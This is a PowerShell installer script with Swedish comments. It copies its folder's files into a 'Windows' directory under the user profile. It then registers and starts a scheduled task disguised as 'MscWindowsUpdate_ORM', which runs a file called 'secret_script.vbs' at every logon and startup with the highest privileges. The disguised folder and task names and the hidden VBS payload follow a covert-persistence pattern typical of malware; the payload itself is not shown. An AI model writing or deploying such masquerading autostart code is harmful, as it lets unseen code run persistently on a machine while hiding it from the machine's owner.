# Kräver administratörsrättigheter för att skapa aktiviteter
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Warning "Kör detta script som Administratör!"
    Pause
    exit
}

# --- 1. Definiera sökvägar ---
$SourceFolder = $PSScriptRoot # Mappen där detta installationsscript ligger
$TargetFolder = "$env:USERPROFILE\Windows" # Skapar mappen "Windows" i C:\Users\Användarnamn\
$MainScript = "script\secret_script.vbs" # Byt detta till vad din .vbs-fil faktiskt heter

# --- 2. Skapa den särskilda mappen ---
if (!(Test-Path -Path $TargetFolder)) {
    New-Item -ItemType Directory -Path $TargetFolder | Out-Null
    Write-Host "Skapade mapp: $TargetFolder" -ForegroundColor Green
}

# --- 3. Kopiera filer dit (UPPDATERAD) ---
# Kopierar allt OCH undermappar, men EXKLUDERAR installationsfilerna
Copy-Item -Path "$SourceFolder\*" -Exclude "install.ps1", "Starta_Installation.bat" -Destination $TargetFolder -Recurse -Force
Write-Host "Kopierade filer till $TargetFolder (exkluderade installationsfilerna)" -ForegroundColor Green

# --- 4. Skapa en Schemalagd Aktivitet ---
$TaskName = "MscWindowsUpdate_ORM" # Samma namn som på din skärmbild 

# NYTT: Ta bort den gamla aktiviteten först så vi får ett helt rent blad
Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue

# Vad aktiviteten ska göra
$Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$TargetFolder\$MainScript`""

# När den ska köras
$TriggerLogon = New-ScheduledTaskTrigger -AtLogon
$TriggerStartup = New-ScheduledTaskTrigger -AtStartup 

# Kör som den inloggade användaren med högsta behörighet
$Principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Highest

# --- Inställningar ---
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
# Tvinga värdena till falskt för att vara på den absolut säkra sidan
$Settings.DisallowStartIfOnBatteries = $false
$Settings.StopIfGoingOnBatteries = $false

# Registrera aktiviteten i Windows (nu byggs den upp från noll)
Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger @($TriggerLogon, $TriggerStartup) -Principal $Principal -Settings $Settings -Force | Out-Null
Write-Host "Schemalagd aktivitet '$TaskName' är nu skapad!" -ForegroundColor Green

# --- Starta aktiviteten direkt ---
Start-ScheduledTask -TaskName $TaskName
Write-Host "Aktiviteten har startats" -ForegroundColor Yellow

Write-Host "Installationen är helt färdig!" -ForegroundColor Cyan
Start-Sleep -Seconds 3